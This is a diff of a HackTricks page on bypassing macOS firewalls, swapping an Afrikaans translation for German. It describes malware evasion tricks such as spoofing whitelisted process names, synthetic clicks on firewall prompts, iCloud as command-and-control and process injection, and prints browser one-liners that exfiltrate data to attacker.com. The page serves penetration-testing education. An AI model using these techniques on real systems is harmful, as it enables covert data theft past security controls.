@@ -1,57 +1,57 @@
-# macOS Deurbranders omseil
+# macOS Umgehen von Firewalls
 
 {% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Kenner (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Kenner (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Gevonde tegnieke
+## Gefundene Techniken
 
-Die volgende tegnieke is gevind wat werk in sommige macOS deurbrandtoepassings.
+Die folgenden Techniken wurden in einigen macOS-Firewall-Apps als funktionierend gefunden.
 
-### Misbruik van witlysname
+### Missbrauch von Whitelist-Namen
 
-* Byvoorbeeld om die kwaadwillige sagteware te noem met name van bekende macOS prosesse soos **`launchd`**
+* Zum Beispiel das Malware mit Namen bekannter macOS-Prozesse wie **`launchd`** aufrufen
 
-### Sintetiese Kliek
+### Synthetischer Klick
 
-* As die deurbranders toestemming aan die gebruiker vra, laat die kwaadwillige sagteware **toestemming gee**
+* Wenn die Firewall den Benutzer um Erlaubnis bittet, lassen Sie die Malware **auf Erlauben klicken**
 
-### **Gebruik Apple-ondertekende binêre lêers**
+### **Verwenden Sie von Apple signierte Binärdateien**
 
-* Soos **`curl`**, maar ook ander soos **`whois`**
+* Wie **`curl`**, aber auch andere wie **`whois`**
 
-### Bekende apple-domeine
+### Bekannte Apple-Domains
 
-Die deurbranders kan verbindinge toelaat na bekende apple-domeine soos **`apple.com`** of **`icloud.com`**. En iCloud kan gebruik word as 'n C2.
+Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** zulassen. Und iCloud könnte als C2 verwendet werden.
 
-### Generiese Omseiling
+### Generisches Umgehen
 
-Sommige idees om deurbranders te probeer omseil
+Einige Ideen, um zu versuchen, Firewalls zu umgehen
 
-### Kontroleer toegelate verkeer
+### Überprüfen Sie den erlaubten Datenverkehr
 
-Om die toegelate verkeer te ken sal jou help om potensieel witlys-domeine te identifiseer of watter toepassings toegelaat word om daartoe toegang te verkry
+Zu wissen, welcher Datenverkehr erlaubt ist, hilft Ihnen, potenziell auf die Whitelist gesetzte Domains oder welche Anwendungen Zugriff darauf haben, zu identifizieren.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Misbruik van DNS
+### Missbrauch von DNS
 
-DNS-oplossings word gedoen via die **`mdnsreponder`** ondertekende aansoek wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.
+DNS-Auflösungen erfolgen über die signierte Anwendung **`mdnsreponder`**, die wahrscheinlich berechtigt ist, DNS-Server zu kontaktieren.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Blaaier-toepassings
+### Über Browser-Apps
 
 * **oascript**
 ```applescript
@@ -70,7 +70,7 @@ end tell
 ```
 {% endcode %}
 
-* Vuurvos
+* Firefox
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
@@ -78,29 +78,29 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Via prosesinspuitings
+### Via Prozesseinjektionen
 
-Indien jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die vuurmuurbeveiligings omseil:
+Wenn Sie **Code in einen Prozess injizieren** können, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, könnten Sie die Firewall-Schutzmaßnahmen umgehen:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
 {% endcontent-ref %}
 
-## Verwysings
+## Referenzen
 
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
